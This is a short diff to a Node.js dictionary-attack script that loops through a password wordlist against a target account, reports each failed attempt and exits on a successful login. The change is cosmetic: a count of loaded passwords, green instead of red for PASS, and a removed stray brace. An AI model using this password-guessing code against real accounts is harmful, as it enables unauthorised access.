@@ -65,6 +65,8 @@ const main = async () => {
 
 			passwds = fs.readFileSync(wordlist, "utf-8").split(/\r?\n/);
 
+			console.log(`[ ${chalk.yellow("INFO")} ] ` + `${passwds.length - 1} possible passwords loaded from ${wordlist}.`);
+
 			for (let passwd of passwds) {
 				if (passwd.length <= 6) continue;
 
@@ -79,8 +81,8 @@ const main = async () => {
 					console.log(`[ ${chalk.red("FAIL")} ] ` + `${passwd} is incorrect.`);
 					delay(delayTime);
 				} else {
-					console.log(`[ ${chalk.red("PASS")} ] ` + `${passwd} is correct.`);
-					console.log(`[ ${chalk.red("PASS")} ] ` + `Successfully logged in as ${target} with password ${chalk.bold(passwd)}.}`);
+					console.log(`[ ${chalk.green("PASS")} ] ` + `${passwd} is correct.`);
+					console.log(`[ ${chalk.green("PASS")} ] ` + `Successfully logged in as ${target} with password ${chalk.bold(passwd)}.`);
 					process.exit(0);
 				}
 
